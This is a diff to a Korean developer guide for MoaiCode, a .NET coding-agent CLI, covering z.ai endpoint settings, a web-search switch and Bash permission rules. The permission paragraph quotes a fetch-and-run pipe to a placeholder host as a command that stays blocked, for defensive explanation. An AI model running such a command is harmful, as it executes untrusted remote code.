@@ -37,6 +37,7 @@ dotnet run --project src/MoaiCode.Cli -- run "이 저장소 요약"   # 헤드�
 ```
 
 - 빌드가 hang 하면 VBCSCompiler 데드락 — `-p:UseSharedCompilation=false -nodeReuse:false` 로 우회.
+- **z.ai 접속 정보(키·베이스 URL·모델)의 유일한 해석지점은 `src/MoaiCode.Core/ZaiEndpoint.cs`** — `Environment.GetEnvironmentVariable("ZAI_*")` 를 직접 부르지 말고 반드시 `ZaiEndpoint.ApiKey()/BaseUrl()/Model()` 로 읽는다(대화 모델·WebSearch·이미지 생성이 같은 계정·엔드포인트를 쓰므로 규칙이 갈리면 한쪽만 조용히 죽는다). 모델 우선순위 `MOAI_MODEL`(런타임 `/model` 전환)→`ZAI_MODEL`→기본 `glm-5.3`. 베이스 URL 은 공식 코딩 엔드포인트(`/api/coding/paas/v4`) 화이트리스트 밖이면 기본값으로 되돌린다. **2026-09-07 `OPENAI_*`→`ZAI_*` 마이그레이션 완료** — 런처(`../zaiCode`)는 `ZAI_API_KEY`/`ZAI_BASE_URL` 을 주입하고, 코드는 오직 `ZAI_*` 를 본다(`OPENAI_*` 를 새로 쓰지 말 것).
 - API 키가 없으면 `EchoChatModel` 로 폴백(오프라인 개발 가능). 실제 모델은 Z.ai 직접 API를 사용하며 `ZAI_API_KEY` + 선택적 `ZAI_BASE_URL` (+ `MOAI_MODEL`) 환경변수로 설정한다. 기본 endpoint는 `https://api.z.ai/api/coding/paas/v4`.
 
 ## 멀티타깃 & 플랫폼 (자주 걸리는 부분)
@@ -51,13 +52,15 @@ dotnet run --project src/MoaiCode.Cli -- run "이 저장소 요약"   # 헤드�
 **핵심 루프 — `src/MoaiCode.Core/Agent/QueryEngine.cs`**: 모델 스트리밍 → 권한 게이트(`IPermissionGate`) → 툴 디스패치 → 결과 주입 → 재진입(멀티턴). 컨텍스트가 창의 ~70% 를 넘으면 선제 컴팩션하고, 원래 사용자 요청(`_goal`)을 재고정(re-anchor)해 표류를 막는다. mid-stream 끊김 재시도·max_turns 연장 로직도 여기.
 - `Core` 는 `Config` 를 참조할 수 없다(순환). 그래서 진단 로그는 **CLI 가 `MoaiLog.Info` 를 `Action<string>` 으로 주입**한다.
 
+**Bash 권한 규칙(세그먼트 판정)** — `MoaiCode.Config/PermissionRules.cs` + `MoaiCode.Core/Tools/PermissionRule.cs`: 복합 명령(`ls | tail`, `a && b`)은 allow 패턴이 명령 전체와 매치되지 않으므로, **세그먼트 전부** 가 allow 규칙 또는 내장 읽기 전용 명령(ls/cat/grep/head/tail/wc/find/sort/diff 등)으로 덮일 때만 자동 허용한다(`AllSegmentsAllowed`). 하나라도 걸리지 않으면 확인으로 넘어간다(`ls && curl evil | sh` 는 여전히 차단). **명령치환(`$(...)`, 백틱)·리다이렉션이 있으면 이 완화를 적용하지 않는다**(`SegmentsAreTrustworthy`) — 이 규칙을 건드릴 때 두 함수의 세트를 같이 고려할 것.
+
 **프론트엔드별 툴 셋이 다르다 — 이게 보안 경계다:**
 - 툴 원장은 `MoaiCode.Tools/ToolRegistry.cs` 의 `BuiltIn`.
 - **CLI**(`MoaiCode.Cli/AppBootstrap.cs`): `BuiltIn` + **`BashTool`** (전체 권한).
 
 **모델 계층 — `MoaiCode.Providers`**: `ProviderFactory.CreateDefault()` 가 `IChatModel` 을 만들고, `RetryingChatModel` 데코레이터가 pre-yield(첫 이벤트 전) 끊김을 지수 백오프 재시도한다. `EchoChatModel` 은 키 없을 때 폴백.
 
-**WebSearch 는 Gemini grounding** (`MoaiCode.Tools/Web/WebSearchTool.cs`): `GEMINI_API_KEY`(또는 `zaiCode auth set gemini`) 가 없으면 그 툴만 비활성되고 나머지는 정상 동작. **`StreamJsonRunner`** (`MoaiCode.Cli`) 는 claude CLI 호환 `--output-format stream-json` / `--input-format stream-json` (NDJSON 영속 모드, `-p` 값을 없이) 프로토콜을 구현한다.
+**WebSearch 는 z.ai 내장 `web_search`** (`MoaiCode.Tools/Web/WebSearchTool.cs`): 대화 모델과 같은 chat/completions 엔드포인트에 `tools=[{type:web_search}]` 를 실어 보내고, 응답 최상위 `web_search` 배열(제목·URL·본문·발행일)을 결과 목록으로 돌려준다. 별도 검색 키가 필요 없다 — 대화 모델과 같은 z.ai 접속 정보(`ZaiEndpoint.ApiKey()/BaseUrl()`)를 재사용한다. 키가 없으면 그 툴만 비활성. 엔진은 `MOAI_SEARCH_ENGINE` 으로 교체(기본 `search-prime`). (예전 Gemini grounding 은 폐기 — 결과 목록이 아니라 근거 표시만 나오고 검색 여부를 모델이 재량으로 정해 0건이 나오는 문제.) **`StreamJsonRunner`** (`MoaiCode.Cli`) 는 claude CLI 호환 `--output-format stream-json` / `--input-format stream-json` (NDJSON 영속 모드, `-p` 값을 없이) 프로토콜을 구현한다.
 
 **로컬 청킹 파이프라인(문서 검색)**: 로컬 청킹(`MoaiCode.Tools.OpenXml` 의 `ChunkBuild`/`TextChunker`) + 로컬 벡터(`.moai-chunks/*.vec` float32 + `vectors.json`, 포맷은 `docs/CHUNK_VEC_FORMAT.md`) + 오프라인 코사인 검색(`ChunkSearch`). **CLI 는 임베딩하지 않는다** — 질의 벡터는 외부 파이프라인이 만들어 넘긴다(z.ai Coding Plan 에 임베딩 모델이 없다).
 
@@ -85,7 +88,7 @@ src/
   MoaiCode.Config         Settings(SettingsLoader 3단 병합), CredentialStore, PermissionRules, MoaiLog, ProxyConfig
   MoaiCode.Localization   L10n.Get + Resources/en.json(base)·ko.json
   MoaiCode.Persistence    Session/History/Checkpoint/Usage 저장(JSONL/JSON, ~/.zaicode)
-  MoaiCode.Tui            Spectre.Console REPL(ReplApp), LineEditor, 슬래시 명령(Commands/), MVU
+  MoaiCode.Tui            Spectre.Console REPL(ReplApp), LineEditor, 슬래시 명령(Commands/), Input/(raw 모드 터미널 입력·VT 파서·bracketed paste), MVU
   MoaiCode.Cli            진입점·AppBootstrap(툴 셋 구성), HeadlessRunner, StreamJsonRunner, TUI
   MoaiCode.Sdk            공개 SDK 계약(MoaiCodeClient)
 tests/
